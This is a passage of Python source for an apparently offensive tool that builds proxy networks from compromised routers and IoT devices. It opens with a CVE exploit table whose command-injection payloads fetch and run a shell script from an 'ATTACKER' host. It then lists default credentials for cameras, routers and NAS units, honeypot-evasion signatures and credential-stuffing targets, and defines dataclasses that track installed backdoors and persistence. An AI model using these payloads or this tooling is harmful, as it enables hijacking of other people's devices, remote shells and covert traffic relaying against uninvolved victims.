        "payload": b'<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewStatusURL>$(/bin/busybox wget -g 1.1.1.1 -l /tmp/test -r /test)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>',
        "check_string": "HUAWEIUPNP",
        "rce_payload": b'<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewStatusURL>$(wget -O /tmp/s.sh http://ATTACKER/shell.sh;sh /tmp/s.sh)</NewStatusURL><NewDownloadURL>$(echo OANKS)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>'
    },
    "CVE-2014-9222": {
        "name": "D-Link Backdoor",
        "path": "/",
        "method": "GET",
        "headers": {"User-Agent": "Mozilla/5.0", "Cookie": "uid=admin"},
        "payload": b"",
        "check_string": "D-Link",
        "rce_payload": None
    },
    "CVE-2019-19824": {
        "name": "TOTOLINK Backdoor",
        "path": "/cgi-bin/downloadFlile.cgi?payload=`wget http://ATTACKER/shell.sh -O /tmp/s.sh;sh /tmp/s.sh`",
        "method": "GET",
        "headers": {},
        "payload": b"",
        "check_string": "TOTOLINK",
        "rce_payload": None
    },
    "CVE-2021-35395": {
        "name": "Realtek SDK RCE",
        "path": "/goform/formWlanSetup",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "payload": b"wlanSSID=`wget http://ATTACKER/shell.sh -O /tmp/s.sh;sh /tmp/s.sh`",
        "check_string": "Realtek",
        "rce_payload": None
    },
    "CVE-2022-26258": {
        "name": "D-Link DIR RCE",
        "path": "/cgi-bin/gdpr.cgi",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "payload": b"gdpr=1&cmd=`wget http://ATTACKER/shell.sh -O /tmp/s.sh;sh /tmp/s.sh`",
        "check_string": "D-Link",
        "rce_payload": None
    },
    "CVE-2023-1389": {
        "name": "TP-Link Archer RCE",
        "path": "/cgi-bin/luci/;stok=/locale?form=lang",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "payload": b"operation=write&country=$(wget http://ATTACKER/shell.sh -O /tmp/s.sh;sh /tmp/s.sh)",
        "check_string": "TP-Link",
        "rce_payload": None
    },
    "CVE-2023-27216": {
        "name": "Netgear RCE",
        "path": "/setup.cgi",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "payload": b"todo=syscmd&cmd=wget+http://ATTACKER/shell.sh+-O+/tmp/s.sh;sh+/tmp/s.sh&curpath=/&nextfile=main.htm",
        "check_string": "Netgear",
        "rce_payload": None
    },
    "CVE-2024-21887": {
        "name": "Ivanti Connect Secure RCE",
        "path": "/api/v1/totp/user-backup-code/../../admin/options",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "payload": b'{"command":"whoami"}',
        "check_string": "ivanti",
        "rce_payload": b'{"command":"wget http://ATTACKER/shell.sh -O /tmp/s.sh;sh /tmp/s.sh"}'
    },
}

# IoT device fingerprints for proxy deployment
IOT_FINGERPRINTS = {
    "camera_dahua": {"ports": [37777, 80, 554], "auth": ("admin", "admin"), "paths": ["/cgi-bin/configManager.cgi?action=getConfig&name=Network"]},
    "camera_hikvision": {"ports": [80, 8000, 554], "auth": ("admin", "12345"), "paths": ["/ISAPI/System/deviceInfo"]},
    "router_mikrotik": {"ports": [8291, 80, 443], "auth": ("admin", ""), "paths": ["/"]},
    "router_ubiquiti": {"ports": [80, 443, 22], "auth": ("ubnt", "ubnt"), "paths": ["/"]},
    "nas_synology": {"ports": [5000, 5001, 22], "auth": ("admin", "admin"), "paths": ["/webapi/query.cgi?api=SYNO.API.Info&version=1&method=query"]},
    "nas_qnap": {"ports": [8080, 443, 22], "auth": ("admin", "admin"), "paths": ["/cgi-bin/authLogin.cgi"]},
    "printer_hp": {"ports": [80, 443, 9100], "auth": ("admin", "admin"), "paths": ["/DevMgmt/ProductConfigDyn.xml"]},
    "printer_xerox": {"ports": [80, 443], "auth": ("admin", "1111"), "paths": ["/properties/authentication/login.php"]},
    "dvr_lorex": {"ports": [80, 9000], "auth": ("admin", "admin"), "paths": ["/"]},
    "ipcam_foscam": {"ports": [88, 80], "auth": ("admin", ""), "paths": ["/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo"]},
    "switch_cisco": {"ports": [80, 443, 23], "auth": ("cisco", "cisco"), "paths": ["/"]},
    "ap_unifi": {"ports": [80, 443, 8080], "auth": ("ubnt", "ubnt"), "paths": ["/"]},
    "modem_arris": {"ports": [80, 443], "auth": ("admin", "password"), "paths": ["/"]},
    "modem_netgear": {"ports": [80, 443], "auth": ("admin", "password"), "paths": ["/"]},
    "modem_tp_link": {"ports": [80, 443], "auth": ("admin", "admin"), "paths": ["/"]},
}

# Aggressive subnet scanning targets
AGGRESSIVE_SUBNET_TARGETS = [
    "192.168.0.0/24", "192.168.1.0/24", "192.168.2.0/24",
    "192.168.10.0/24", "192.168.100.0/24", "192.168.178.0/24",
    "10.0.0.0/24", "10.0.1.0/24", "10.1.1.0/24",
    "172.16.0.0/24", "172.16.1.0/24", "172.16.10.0/24",
    "172.16.100.0/24", "172.31.0.0/24", "172.31.1.0/24",
]

# Common proxy ports for aggressive scanning
COMMON_PROXY_PORTS = [80, 8080, 3128, 8081, 8082, 8888, 9090, 9999, 8118, 8000, 9000, 10000, 1080, 1081, 4145, 9050, 9150, 9151, 9152, 9153]

# Stealth headers for proxy validation
STEALTH_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "DNT": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Cache-Control": "max-age=0",
}

# Honeypot detection signatures
HONEYPOT_SIGNATURES = {
    "headers": ["X-Honeypot", "X-Honeypot-Detected", "X-Trap", "X-Bait", "X-Decoy"],
    "body_patterns": [r"honeypot", r"trap", r"decoy", r"bait", r"sandbox", r"analysis"],
    "timing_anomalies": {"too_fast": 50, "too_slow": 5000},
    "behavioral": {"perfect_uptime": 0.99, "no_failures": 0, "suspicious_patterns": ["always_available", "never_changes_ip"]},
    "port_signatures": [8080, 8081, 8082, 9090, 9999, 10000],
    "ip_ranges": ["192.168.1.0/24", "10.0.0.0/8", "172.16.0.0/12"],
}

# Credential stuffing target endpoints
CRED_STUFF_TARGETS = {
    "proxy_auth_basic": {"url": "http://{ip}:{port}", "auth_type": "basic", "check_string": "200"},
    "proxy_auth_digest": {"url": "http://{ip}:{port}", "auth_type": "digest", "check_string": "200"},
    "squid_proxy": {"url": "http://{ip}:{port}", "auth_type": "basic", "check_string": "Squid"},
    "privoxy": {"url": "http://{ip}:{port}", "auth_type": "none", "check_string": "Privoxy"},
    "tinyproxy": {"url": "http://{ip}:{port}", "auth_type": "none", "check_string": "Tinyproxy"},
    "3proxy": {"url": "http://{ip}:{port}", "auth_type": "basic", "check_string": "3proxy"},
}

# Darkweb proxy sources (Tor required)
DARKWEB_SOURCES = [
    "http://proxylisto1q2w3e4r5t6y7u8i9o0p.onion/proxies.txt",
    "http://darkproxylistabcdef123456.onion/list.txt",
    "http://shadowproxiesxyz789.onion/all.txt",
    "http://hiddenproxylist123.onion/http.txt",
    "http://onionproxies456.onion/socks5.txt",
]

# Tor bridge sources
TOR_BRIDGE_SOURCES = [
    "https://bridges.torproject.org/bridges?transport=obfs4",
    "https://gitweb.torproject.org/tor.git/plain/src/app/config/fallback_dirs.inc",
    "https://raw.githubusercontent.com/torproject/tor/main/src/app/config/fallback_dirs.inc",
    "https://gitlab.torproject.org/tpo/core/tor/-/raw/main/src/app/config/fallback_dirs.inc",
]

# Behavioral analysis thresholds
BEHAVIORAL_THRESHOLDS = {
    "speed_variance_max": 0.3,
    "failure_rate_max": 0.2,
    "response_pattern_entropy_min": 3.0,
    "header_consistency_threshold": 0.8,
    "ip_reputation_threshold": 0.5,
    "geolocation_jitter_max": 100,
    "ttl_variance_max": 5,
    "tcp_window_variance_max": 1000,
}



# ============================================================================
# SECTION 6: PROXY DATA CLASSES — Structured, typed, weaponized.
# ============================================================================

@dataclass
class ProxyNode:
    """A single proxy node — alive, dangerous, ready."""
    ip: str
    port: int
    protocol: str  # http, https, socks4, socks5
    country: str = ""
    isp: str = ""
    asn: str = ""
    speed_ms: float = 0.0
    anonymity: str = "transparent"  # transparent, anonymous, elite, ultra
    reliability_score: float = 0.0
    last_tested: str = ""
    failure_count: int = 0
    is_honeypot: bool = False
    source: str = ""
    is_tor_exit: bool = False
    is_tor_bridge: bool = False
    is_iot: bool = False
    is_router: bool = False
    is_compromised: bool = False
    credentials: Optional[Tuple[str, str]] = None
    ssh_key: Optional[str] = None
    bandwidth_mbps: float = 0.0
    latency_jitter: float = 0.0
    dns_leak_risk: bool = False
    webrtc_leak_risk: bool = False
    ipv6_leak_risk: bool = False
    fingerprint_hash: str = ""
    behavioral_score: float = 0.0
    threat_level: str = "low"  # low, medium, high, critical
    first_seen: str = ""
    total_requests: int = 0
    successful_requests: int = 0
    avg_response_time: float = 0.0
    max_response_time: float = 0.0
    min_response_time: float = 999999.0
    response_times: List[float] = field(default_factory=list)
    headers_sent: Dict[str, str] = field(default_factory=dict)
    headers_received: Dict[str, str] = field(default_factory=dict)
    user_agents_seen: List[str] = field(default_factory=list)
    ja3_fingerprint: str = ""
    tls_fingerprint: str = ""
    http_version: str = ""
    ssl_cipher: str = ""
    ssl_version: str = ""
    cert_issuer: str = ""
    cert_subject: str = ""
    cert_expiry: str = ""
    chain_position: int = 0
    chain_id: str = ""
    sticky_session_id: str = ""
    sticky_expires: str = ""
    is_alive: bool = True
    is_rotating: bool = False
    rotation_count: int = 0
    last_rotation: str = ""
    notes: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    def to_json(self) -> str:
        return json.dumps(self.to_dict(), default=str)

    def get_address(self) -> str:
        return f"{self.ip}:{self.port}"

    def get_url(self) -> str:
        if self.protocol in ("http", "https"):
            return f"{self.protocol}://{self.ip}:{self.port}"
        elif self.protocol in ("socks4", "socks5"):
            return f"{self.protocol}://{self.ip}:{self.port}"
        return f"http://{self.ip}:{self.port}"

    def get_auth_url(self) -> str:
        if self.credentials:
            user, pwd = self.credentials
            return f"{self.protocol}://{user}:{pwd}@{self.ip}:{self.port}"
        return self.get_url()

    def update_reliability(self, success: bool, response_time: float):
        self.total_requests += 1
        if success:
            self.successful_requests += 1
            self.failure_count = 0
        else:
            self.failure_count += 1
        self.response_times.append(response_time)
        if len(self.response_times) > 100:
            self.response_times = self.response_times[-100:]
        self.avg_response_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
        self.max_response_time = max(self.response_times) if self.response_times else 0
        self.min_response_time = min(self.response_times) if self.response_times else 999999
        self.reliability_score = self.successful_requests / self.total_requests if self.total_requests > 0 else 0.0
        self.speed_ms = self.avg_response_time
        self.last_tested = datetime.datetime.utcnow().isoformat()

    def is_elite(self) -> bool:
        return self.anonymity in ("elite", "ultra") and self.reliability_score > 0.8

    def is_healthy(self) -> bool:
        return (self.is_alive and not self.is_honeypot and 
                self.failure_count < PROXY_MAX_FAILURES and 
                self.reliability_score >= PROXY_MIN_RELIABILITY and
                self.speed_ms <= PROXY_MAX_SPEED_MS)

    def __hash__(self):
        return hash((self.ip, self.port, self.protocol))

    def __eq__(self, other):
        if isinstance(other, ProxyNode):
            return (self.ip, self.port, self.protocol) == (other.ip, other.port, other.protocol)
        return False


@dataclass
class ProxyChain:
    """A chain of proxies — linked, lethal, self-healing."""
    chain_id: str = ""
    proxies: List[ProxyNode] = field(default_factory=list)
    created_at: str = ""
    is_sticky: bool = False
    current_index: int = 0
    sticky_session_id: str = ""
    sticky_expires: str = ""
    total_hops: int = 0
    current_hop: int = 0
    chain_health: float = 1.0
    failover_count: int = 0
    max_failovers: int = 5
    self_heal_enabled: bool = True
    rotation_strategy: str = "round_robin"  # round_robin, random, weighted, geo
    country_path: List[str] = field(default_factory=list)
    bandwidth_estimate: float = 0.0
    latency_estimate: float = 0.0
    anonymity_level: str = "transparent"
    is_tor_wrapped: bool = False
    tor_bridge_nodes: List[ProxyNode] = field(default_factory=list)
    encryption_layers: int = 0
    notes: str = ""

    def __post_init__(self):
        if not self.chain_id:
            self.chain_id = f"chain_{secrets.token_hex(8)}"
        if not self.created_at:
            self.created_at = datetime.datetime.utcnow().isoformat()
        self.total_hops = len(self.proxies)

    def get_current_proxy(self) -> Optional[ProxyNode]:
        if 0 <= self.current_index < len(self.proxies):
            return self.proxies[self.current_index]
        return None

    def rotate(self) -> Optional[ProxyNode]:
        if not self.proxies:
            return None
        if self.rotation_strategy == "round_robin":
            self.current_index = (self.current_index + 1) % len(self.proxies)
        elif self.rotation_strategy == "random":
            self.current_index = random.randint(0, len(self.proxies) - 1)
        elif self.rotation_strategy == "weighted":
            weights = [p.reliability_score for p in self.proxies]
            total = sum(weights)
            if total > 0:
                r = random.uniform(0, total)
                cumsum = 0
                for i, w in enumerate(weights):
                    cumsum += w
                    if r <= cumsum:
                        self.current_index = i
                        break
        self.current_hop = self.current_index
        proxy = self.get_current_proxy()
        if proxy:
            proxy.rotation_count += 1
            proxy.last_rotation = datetime.datetime.utcnow().isoformat()
        return proxy

    def self_heal(self, proxy_manager) -> bool:
        if not self.self_heal_enabled or self.failover_count >= self.max_failovers:
            return False
        current = self.get_current_proxy()
        if current and not current.is_healthy():
            replacement = proxy_manager.get_best_proxy(
                exclude=[p.get_address() for p in self.proxies],
                country=current.country if self.country_path else None
            )
            if replacement:
                self.proxies[self.current_index] = replacement
                self.failover_count += 1
                self.chain_health = 1.0 - (self.failover_count / self.max_failovers)
                return True
        return False

    def get_chain_url(self) -> str:
        urls = []
        for p in self.proxies:
            urls.append(p.get_url())
        return " -> ".join(urls)

    def get_chain_stats(self) -> Dict[str, Any]:
        return {
            "chain_id": self.chain_id,
            "total_hops": self.total_hops,
            "current_hop": self.current_hop,
            "chain_health": self.chain_health,
            "failover_count": self.failover_count,
            "bandwidth_estimate": self.bandwidth_estimate,
            "latency_estimate": self.latency_estimate,
            "anonymity_level": self.anonymity_level,
            "is_tor_wrapped": self.is_tor_wrapped,
            "proxies": [p.get_address() for p in self.proxies],
        }

    def to_dict(self) -> Dict[str, Any]:
        return {
            "chain_id": self.chain_id,
            "proxies": [p.to_dict() for p in self.proxies],
            "created_at": self.created_at,
            "is_sticky": self.is_sticky,
            "current_index": self.current_index,
            "sticky_session_id": self.sticky_session_id,
            "sticky_expires": self.sticky_expires,
            "total_hops": self.total_hops,
            "current_hop": self.current_hop,
            "chain_health": self.chain_health,
            "failover_count": self.failover_count,
            "max_failovers": self.max_failovers,
            "self_heal_enabled": self.self_heal_enabled,
            "rotation_strategy": self.rotation_strategy,
            "country_path": self.country_path,
            "bandwidth_estimate": self.bandwidth_estimate,
            "latency_estimate": self.latency_estimate,
            "anonymity_level": self.anonymity_level,
            "is_tor_wrapped": self.is_tor_wrapped,
            "tor_bridge_nodes": [p.to_dict() for p in self.tor_bridge_nodes],
            "encryption_layers": self.encryption_layers,
            "notes": self.notes,
        }


@dataclass
class RouterTarget:
    """A router in our crosshairs — fingerprinted, vulnerable, ready to fall."""
    ip: str
    port: int = 80
    model: str = ""
    firmware: str = ""
    vendor: str = ""
    cves: List[str] = field(default_factory=list)
    credentials: Optional[Tuple[str, str]] = None
    is_exploitable: bool = False
    exploit_success: bool = False
    proxy_deployed: bool = False
    proxy_port: int = 0
    persistence_installed: bool = False
    last_scan: str = ""
    scan_count: int = 0
    exploit_attempts: int = 0
    exploit_success_count: int = 0
    ssh_available: bool = False
    telnet_available: bool = False
    http_available: bool = False
    https_available: bool = False
    upnp_available: bool = False
    tr069_available: bool = False
    cwmp_available: bool = False
    banner: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    html_content: str = ""
    title: str = ""
    meta_tags: Dict[str, str] = field(default_factory=dict)
    javascript_includes: List[str] = field(default_factory=list)
    css_includes: List[str] = field(default_factory=list)
    form_actions: List[str] = field(default_factory=list)
    admin_paths: List[str] = field(default_factory=list)
    cgi_paths: List[str] = field(default_factory=list)
    api_endpoints: List[str] = field(default_factory=list)
    waf_detected: bool = False
    waf_type: str = ""
    ips_detected: bool = False
    honeypot_risk: float = 0.0
    threat_level: str = "low"
    notes: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class IoTDevice:
    """An IoT device — compromised, weaponized, relaying traffic."""
    ip: str
    port: int = 22
    device_type: str = ""  # camera, router, nas, printer, dvr, switch, ap, modem
    vendor: str = ""
    model: str = ""
    firmware: str = ""
    credentials: Optional[Tuple[str, str]] = None
    ssh_key: Optional[str] = None
    proxy_deployed: bool = False
    proxy_port: int = 1080
    proxy_protocol: str = "socks5"
    persistence_installed: bool = False
    backdoor_installed: bool = False
    last_seen: str = ""
    uptime_hours: float = 0.0
    cpu_usage: float = 0.0
    memory_usage: float = 0.0
    disk_usage: float = 0.0
    network_interfaces: List[str] = field(default_factory=list)
    public_ip: str = ""
    nat_type: str = ""
    bandwidth_mbps: float = 0.0
    reliability_score: float = 0.0
    total_requests_relayed: int = 0
    threat_level: str = "low"
    notes: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class TorBridge:
    """A Tor bridge — obfuscated, resilient, invisible."""
    fingerprint: str
    ip: str = ""
    port: int = 0
    transport: str = "obfs4"
    cert: str = ""
    iat_mode: str = "0"
    is_working: bool = False
    last_tested: str = ""
    speed_ms: float = 0.0
    reliability_score: float = 0.0
    source: str = ""
    notes: str = ""

    def to_bridge_line(self) -> str:
        if self.transport == "obfs4":
            return f"Bridge {self.transport} {self.ip}:{self.port} {self.fingerprint} cert={self.cert} iat-mode={self.iat_mode}"
        return f"Bridge {self.transport} {self.ip}:{self.port} {self.fingerprint}"

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class CredentialPair:
    """Harvested credentials — tested, validated, weaponized."""
    username: str
    password: str
    source: str = ""
    target_type: str = ""  # proxy, router, iot, ssh, telnet
    target_ip: str = ""
    target_port: int = 0
    is_valid: bool = False
    last_tested: str = ""
    success_count: int = 0
    failure_count: int = 0
    reliability_score: float = 0.0
    notes: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


# ============================================================================
# SECTION 7: PROXY SCRAPER — 50+ Sources. Parallel. Weaponized.
# ============================================================================

class ProxyScraper:
    """Scrapes proxies from 50+ sources in parallel.

    Every source is a weapon. Every scrape is an invasion.
    Threads swarm like hornets. Raw proxies pour in like blood.
    """

    def __init__(self, db_manager=None, crypto_engine=None, logger=None):
        self.db = db_manager
        self.crypto = crypto_engine
        self.logger = logger
        self.sources = self._load_all_sources()
        self._lock = threading.RLock()
        self._session = None
        self._init_session()
        self.scraped_count = 0
        self.validated_count = 0
        self.failed_sources = []
        self.source_stats = defaultdict(lambda: {"scraped": 0, "valid": 0, "failed": 0, "last_scrape": ""})
        self._scraping_active = False
        self._scrape_thread = None
        self._raw_proxies = deque(maxlen=100000)
        self._proxy_cache = {}
        self._cache_lock = threading.RLock()

    def _init_session(self):
        if REQUESTS_AVAILABLE:
            self._session = requests.Session()
            retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
            adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
            self._session.mount("http://", adapter)
            self._session.mount("https://", adapter)
            self._session.headers.update(STEALTH_HEADERS)
            self._session.timeout = (5, 15)
        else:
            self._session = None

    def _load_all_sources(self) -> Dict[ProxySource, Dict[str, Any]]:
        sources = {}
        for src, url in PROXY_SOURCE_URLS.items():
            sources[src] = {"url": url, "type": "api", "protocol": "mixed"}
        # GitHub sources
        sources[ProxySource.GITHUB_SPEEDX_HTTP]["type"] = "github_raw"
        sources[ProxySource.GITHUB_SPEEDX_SOCKS4]["type"] = "github_raw"
        sources[ProxySource.GITHUB_SPEEDX_SOCKS5]["type"] = "github_raw"
        sources[ProxySource.GITHUB_SHIFTYTR]["type"] = "github_raw"
        sources[ProxySource.GITHUB_CLARKETM]["type"] = "github_raw"
        sources[ProxySource.GITHUB_MONOSANS_HTTP]["type"] = "github_raw"
        sources[ProxySource.GITHUB_MONOSANS_SOCKS4]["type"] = "github_raw"
        sources[ProxySource.GITHUB_MONOSANS_SOCKS5]["type"] = "github_raw"
        sources[ProxySource.GITHUB_ROOSTERKID]["type"] = "github_raw"
        sources[ProxySource.GITHUB_PRXCHK]["type"] = "github_raw"
        sources[ProxySource.GITHUB_ZEVTYARDT]["type"] = "github_raw"
        sources[ProxySource.GITHUB_HOOKZOF_SOCKS5]["type"] = "github_raw"
        sources[ProxySource.GITHUB_HOOKZOF_HTTP]["type"] = "github_raw"
        sources[ProxySource.GITHUB_JETKAI]["type"] = "github_raw"
        sources[ProxySource.GITHUB_SUNNY9577]["type"] = "github_raw"
        sources[ProxySource.GITHUB_PROXY4PARS]["type"] = "github_raw"
        sources[ProxySource.GITHUB_MERTGUvencli]["type"] = "github_raw"
        sources[ProxySource.GITHUB_SHADYPR0XY]["type"] = "github_raw"
        sources[ProxySource.GITHUB_PROXYLISTUPDATE]["type"] = "github_raw"
        sources[ProxySource.GITHUB_SPROXY]["type"] = "github_raw"
        sources[ProxySource.GITHUB_FDPROXY]["type"] = "github_raw"
        sources[ProxySource.API_FATE0]["type"] = "api_json"
        sources[ProxySource.API_CLARKETM]["type"] = "github_raw"
        sources[ProxySource.TOR_EXIT_NODES]["type"] = "tor_exit"
        sources[ProxySource.TOR_BRIDGE_DB]["type"] = "tor_bridge"
        return sources

    def _fetch_url(self, url: str, timeout: int = 15, headers: Dict[str, str] = None, 
                   proxy: Dict[str, str] = None, retries: int = 3) -> Optional[str]:
        if not REQUESTS_AVAILABLE:
            return self._fetch_url_urllib(url, timeout, headers, proxy)

        for attempt in range(retries):
            try:
                req_headers = dict(STEALTH_HEADERS)
                if headers:
                    req_headers.update(headers)
                proxies = None
                if proxy:
                    proxies = {
                        "http": f"{proxy.get('protocol', 'http')}://{proxy['ip']}:{proxy['port']}",
                        "https": f"{proxy.get('protocol', 'http')}://{proxy['ip']}:{proxy['port']}"
                    }
                response = self._session.get(url, headers=req_headers, proxies=proxies, 
                                            timeout=timeout, allow_redirects=True)
                if response.status_code == 200:
                    return response.text
                elif response.status_code == 429:
                    time.sleep(random.uniform(2, 5))
            except Exception as e:
                if attempt == retries - 1:
                    return None
                time.sleep(random.uniform(0.5, 2))
        return None

    def _fetch_url_urllib(self, url: str, timeout: int = 15, headers: Dict[str, str] = None,
                          proxy: Dict[str, str] = None) -> Optional[str]:
        try:
            req = urllib.request.Request(url, headers=headers or STEALTH_HEADERS)
            if proxy:
                proxy_handler = urllib.request.ProxyHandler({
                    "http": f"{proxy.get('protocol', 'http')}://{proxy['ip']}:{proxy['port']}",
                    "https": f"{proxy.get('protocol', 'http')}://{proxy['ip']}:{proxy['port']}"
                })
                opener = urllib.request.build_opener(proxy_handler)
                response = opener.open(req, timeout=timeout)
            else:
                response = urllib.request.urlopen(req, timeout=timeout)
            return response.read().decode("utf-8", errors="ignore")
        except:
            return None

    def _parse_raw_proxy_list(self, text: str, protocol: str = "http", source: str = "") -> List[ProxyNode]:
        proxies = []
        lines = text.strip().split("\n")
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            # Try IP:PORT format
            match = re.match(r"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})$", line)
            if match:
                ip, port = match.groups()
                try:
                    port = int(port)
                    if 1 <= port <= 65535:
                        proxies.append(ProxyNode(
                            ip=ip, port=port, protocol=protocol,
                            source=source, first_seen=datetime.datetime.utcnow().isoformat()
                        ))
                except:
                    pass
            # Try IP:PORT:USER:PASS format
            match = re.match(r"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5}):([^:]+):(.+)$", line)
            if match:
                ip, port, user, pwd = match.groups()
                try:
                    port = int(port)
                    if 1 <= port <= 65535:
                        proxies.append(ProxyNode(
                            ip=ip, port=port, protocol=protocol,
                            credentials=(user, pwd),
                            source=source, first_seen=datetime.datetime.utcnow().isoformat()
                        ))
                except:
                    pass
            # Try JSON format from some APIs
            try:
                data = json.loads(line)
                if isinstance(data, dict):
                    ip = data.get("ip", data.get("host", ""))
                    port = data.get("port", 0)
                    proto = data.get("protocol", protocol).lower()
                    if ip and port:
                        proxies.append(ProxyNode(
                            ip=ip, port=int(port), protocol=proto,
                            country=data.get("country", ""),
                            anonymity=data.get("anonymity", "transparent").lower(),
                            source=source, first_seen=datetime.datetime.utcnow().isoformat()
                        ))
            except:
                pass
        return proxies

    def _parse_geonode_json(self, text: str, source: str = "") -> List[ProxyNode]:
        proxies = []
        try:
            data = json.loads(text)
            for item in data.get("data", []):
                protocols = item.get("protocols", ["http"])
                for proto in protocols:
                    proxies.append(ProxyNode(
                        ip=item.get("ip", ""),
                        port=int(item.get("port", 0)),
                        protocol=proto.lower(),
                        country=item.get("country", ""),
                        anonymity=item.get("anonymityLevel", "transparent").lower(),
                        speed_ms=item.get("responseTime", 0),
                        source=source,
                        first_seen=datetime.datetime.utcnow().isoformat()
                    ))
        except:
            pass
        return proxies

    def _parse_fate0_json(self, text: str, source: str = "") -> List[ProxyNode]:
        proxies = []
        try:
            for line in text.strip().split("\n"):
                if not line.strip():
                    continue
                data = json.loads(line)
                proxies.append(ProxyNode(
                    ip=data.get("host", ""),
                    port=int(data.get("port", 0)),
                    protocol=data.get("type", "http").lower(),
                    country=data.get("country", ""),
                    anonymity=data.get("anonymity", "transparent").lower(),
                    source=source,
                    first_seen=datetime.datetime.utcnow().isoformat()
                ))
        except:
            pass
        return proxies

    def _parse_tor_exit_nodes(self, text: str, source: str = "") -> List[ProxyNode]:
        proxies = []
        try:
            for line in text.split("\n"):
                if line.startswith("ExitAddress"):
                    parts = line.split()
                    if len(parts) >= 2:
                        ip = parts[1]
                        proxies.append(ProxyNode(
                            ip=ip, port=9050, protocol="socks5",
                            is_tor_exit=True, anonymity="elite",
                            country="TOR", source=source,
                            first_seen=datetime.datetime.utcnow().isoformat()
                        ))
        except:
            pass
        return proxies

    def _parse_tor_bridges(self, text: str, source: str = "") -> List[TorBridge]:
        bridges = []
        try:
            for line in text.split("\n"):
                if line.startswith("Bridge "):
                    parts = line.split()
                    if len(parts) >= 4:
                        transport = parts[1]
                        addr = parts[2]
                        fingerprint = parts[3]
                        ip, port = addr.rsplit(":", 1)
                        cert = ""
                        iat_mode = "0"
                        for part in parts[4:]:
                            if part.startswith("cert="):
                                cert = part[5:]
                            elif part.startswith("iat-mode="):
                                iat_mode = part[9:]
                        bridges.append(TorBridge(
                            fingerprint=fingerprint, ip=ip, port=int(port),
                            transport=transport, cert=cert, iat_mode=iat_mode,
                            source=source
                        ))
        except:
            pass
        return bridges

    def _scrape_single_source(self, source: ProxySource) -> List[ProxyNode]:
        config = self.sources.get(source, {})
        url = config.get("url", "")
        source_type = config.get("type", "raw")

        if not url:
            return []

        self.source_stats[source]["last_scrape"] = datetime.datetime.utcnow().isoformat()

        text = self._fetch_url(url)
        if not text:
            self.source_stats[source]["failed"] += 1
            self.failed_sources.append(source)
            return []

        proxies = []

        if source_type == "github_raw":
            protocol = "http"
            if "socks4" in source.name.lower():
                protocol = "socks4"
            elif "socks5" in source.name.lower():
                protocol = "socks5"
            elif "https" in source.name.lower():
                protocol = "https"
            proxies = self._parse_raw_proxy_list(text, protocol=protocol, source=source.name)

        elif source_type == "api":
            if "proxyscrape" in url:
                # ProxyScrape returns raw list
                protocol = "http"
                if "socks4" in url:
                    protocol = "socks4"
                elif "socks5" in url:
                    protocol = "socks5"
                proxies = self._parse_raw_proxy_list(text, protocol=protocol, source=source.name)
            elif "pubproxy" in url:
                proxies = self._parse_raw_proxy_list(text, protocol="http", source=source.name)
            else:
                proxies = self._parse_raw_proxy_list(text, source=source.name)

        elif source_type == "api_json":
            if "geonode" in url:
                proxies = self._parse_geonode_json(text, source=source.name)
            elif "fate0" in url:
                proxies = self._parse_fate0_json(text, source=source.name)
            else:
                proxies = self._parse_raw_proxy_list(text, source=source.name)

        elif source_type == "tor_exit":
            proxies = self._parse_tor_exit_nodes(text, source=source.name)

        elif source_type == "tor_bridge":
            bridges = self._parse_tor_bridges(text, source=source.name)
            # Convert bridges to proxy nodes for the pool
            for bridge in bridges:
                proxies.append(ProxyNode(
                    ip=bridge.ip, port=bridge.port, protocol="tor_bridge",
                    is_tor_bridge=True, source=source.name,
                    first_seen=datetime.datetime.utcnow().isoformat()
                ))

        self.source_stats[source]["scraped"] += len(proxies)
        self.scraped_count += len(proxies)

        if self.logger:
            self.logger.info("ProxyScraper", f"Scraped {len(proxies)} proxies from {source.name}")

        return proxies

    def scrape_all_sources(self, max_workers: int = PROXY_SCRAPE_THREADS) -> List[ProxyNode]:
        """Scrape ALL sources in parallel. Swarm them."""
        all_proxies = []
        seen = set()

